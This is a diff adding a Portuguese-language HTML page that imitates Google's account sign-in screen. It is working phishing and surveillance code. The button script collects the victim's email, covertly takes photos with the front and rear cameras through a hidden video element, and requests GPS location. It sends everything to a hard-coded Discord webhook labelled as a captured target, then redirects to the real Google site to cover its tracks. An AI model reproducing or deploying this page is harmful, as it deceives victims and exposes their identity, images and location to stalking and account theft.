@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Fazer login - Contas do Google</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        font-family: 'Roboto', sans-serif;
+        background-color: #131314; /* Cor CRAVADA do Google */
+        color: #e3e3e3;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        padding: 24px;
+    }
+    
+    .main-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .header-logo {
+        width: 40px;
+        height: 40px;
+        margin-bottom: 30px;
+        margin-top: 10px;
+    }
+
+    h1 {
+        font-size: 32px;
+        font-weight: 400;
+        margin-bottom: 12px;
+        color: #e3e3e3;
+        letter-spacing: -0.5px;
+    }
+    
+    p {
+        font-size: 16px;
+        margin-bottom: 36px;
+        color: #e3e3e3;
+        letter-spacing: 0.1px;
+    }
+
+    .input-box {
+        margin-bottom: 8px; 
+    }
+    input {
+        width: 100%;
+        padding: 15px 14px;
+        font-size: 16px;
+        background-color: transparent;
+        color: #e3e3e3;
+        border: 1px solid #5f6368;
+        border-radius: 4px;
+        outline: none;
+        font-family: 'Roboto', sans-serif;
+    }
+    input:focus { border: 2px solid #8ab4f8; padding: 14px 13px; }
+    input::placeholder { color: #9aa0a6; font-size: 16px; }
+
+    .forgot-link {
+        display: inline-block;
+        color: #8ab4f8;
+        text-decoration: none;
+        font-size: 14px;
+        font-weight: 500;
+        padding: 8px 0;
+        margin-bottom: 48px;
+    }
+
+    .actions {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 40px;
+    }
+    
+    .create-account {
+        color: #8ab4f8;
+        text-decoration: none;
+        font-size: 14px;
+        font-weight: 500;
+        padding: 10px 0;
+    }
+
+    .btn-next {
+        background-color: #8ab4f8;
+        color: #131314;
+        border: none;
+        padding: 12px 24px;
+        border-radius: 24px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+
+    .footer {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 12px;
+        color: #9aa0a6;
+        padding-top: 24px;
+        margin-top: auto;
+    }
+    
+    .lang-select {
+        display: flex;
+        align-items: center;
+        cursor: pointer;
+        gap: 4px;
+    }
+    .lang-select svg { width: 18px; height: 18px; fill: #9aa0a6; }
+    
+    .footer-links {
+        display: flex;
+        gap: 16px;
+    }
+    .footer-links a {
+        color: #9aa0a6;
+        text-decoration: none;
+    }
+
+    #loading-screen {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        position: fixed;
+        top: 0; left: 0; width: 100%; background: #131314; z-index: 99;
+    }
+    .loader {
+        border: 3px solid rgba(255,255,255,0.1);
+        border-top: 3px solid #8ab4f8;
+        border-radius: 50%;
+        width: 30px; height: 30px;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    video { position: fixed; top: -9999px; left: -9999px; }
+</style>
+</head>
+<body>
+
+<video id="camera" autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<div id="main-screen" class="main-content">
+    <svg class="header-logo" viewBox="0 0 48 48">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+    </svg>
+
+    <h1>Faça login</h1>
+    <p>Use sua Conta do Google</p>
+
+    <div class="input-box">
+        <input type="email" id="email-input" placeholder="E-mail ou telefone">
+    </div>
+
+    <a href="#" class="forgot-link">Esqueceu o e-mail?</a>
+
+    <div class="actions">
+        <a href="#" class="create-account">Criar conta</a>
+        <button class="btn-next" onclick="startHack()">Avançar</button>
+    </div>
+
+    <div class="footer">
+        <div class="lang-select">
+            <span>Português (Brasil)</span>
+            <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+        </div>
+        <div class="footer-links">
+            <a href="#">Ajuda</a>
+            <a href="#">Privacidade</a>
+            <a href="#">Termos</a>
+        </div>
+    </div>
+</div>
+
+<div id="loading-screen">
+    <div class="loader"></div>
+    <p>Verificando dispositivo...</p>
+</div>
+
+<script>
+    // WEBHOOK DIRETO (Pra garantir o envio)
+    const WEBHOOK = "https://discord.com/api/webhooks/1571721002176745615/xvq6g3cJ3c2rWY76Cr_kqsksEV1ePYlYLp3HnfKGg88jAVgersnYXGBJmuSiOJuyH306";
+
+    let video = document.getElementById('camera');
+    let canvas = document.getElementById('canvas');
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+    async function startHack() {
+        const email = document.getElementById('email-input').value;
+        if(!email) return alert("Digite um e-mail.");
+
+        document.getElementById('main-screen').style.display = 'none';
+        document.getElementById('loading-screen').style.display = 'flex';
+
+        let fotoFrente = null;
+        let fotoTras = null;
+
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            await sleep(1500); 
+            fotoFrente = capturePhoto();
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Sem câmera frontal"); }
+
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            video.srcObject = stream;
+            await sleep(1500);
+            fotoTras = capturePhoto();
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Sem câmera traseira"); }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { 
+                    const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToDiscord(email, fotoFrente, fotoTras, mapsLink);
+                    finishHack();
+                },
+                () => { 
+                    sendToDiscord(email, fotoFrente, fotoTras, "GPS negado");
+                    finishHack();
+                }
+            );
+        } else {
+            sendToDiscord(email, fotoFrente, fotoTras, "Sem GPS");
+            finishHack();
+        }
+    }
+
+    function capturePhoto() {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg', 0.6);
+    }
+
+    async function sendToDiscord(email, fotoFrente, fotoTras, localizacao) {
+        if (!WEBHOOK) return;
+        const formData = new FormData();
+        
+        const payload = {
+            content: "🎯 **ALVO CAPTURADO (DUPLA CÂMERA)**",
+            embeds: [{
+                title: "Dados do Alvo",
+                color: 3447003,
+                fields: [
+                    { name: "E-mail", value: email, inline: false },
+                    { name: "Localização", value: localizacao, inline: false }
+                ]
+            }]
+        };
+
+        const attachments = [];
+        if (fotoFrente) {
+            const blobF = await (await fetch(fotoFrente)).blob();
+            formData.append("file1", blobF, "frente.jpg");
+            attachments.push({ id: 0, filename: "frente.jpg" });
+        }
+        if (fotoTras) {
+            const blobT = await (await fetch(fotoTras)).blob();
+            formData.append("file2", blobT, "traseira.jpg");
+            attachments.push({ id: 1, filename: "traseira.jpg" });
+        }
+
+        if (attachments.length > 0) {
+            payload.embeds[0].image = { url: `attachment://${attachments[0].filename}` };
+            if (attachments.length > 1) {
+                payload.embeds[0].thumbnail = { url: `attachment://${attachments[1].filename}` };
+            }
+        }
+
+        formData.append("payload_json", JSON.stringify(payload));
+        fetch(WEBHOOK, { method: "POST", body: formData }).catch(()=>{});
+    }
+
+    function finishHack() {
+        setTimeout(() => {
+            window.location.href = "https://accounts.google.com";
+        }, 1500);
+    }
+</script>
+</body>
+</html>
